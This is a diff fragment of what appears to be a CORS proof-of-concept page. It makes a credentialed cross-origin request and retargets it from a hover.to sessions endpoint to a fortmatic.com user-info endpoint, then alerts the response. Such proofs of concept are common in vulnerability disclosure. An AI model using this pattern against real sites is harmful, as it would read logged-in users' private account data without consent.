@@ -16,7 +16,7 @@ if (this.readyState == 4 && this.status == 200) {
 document.getElementById("demo").innerHTML = alert(this.responseText);
 }
 };
-xhttp.open("GET", "https://hover.to/api/v1/sessions", true);
+xhttp.open("GET", "https://api.fortmatic.com/v2/dashboard/api_user/info", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
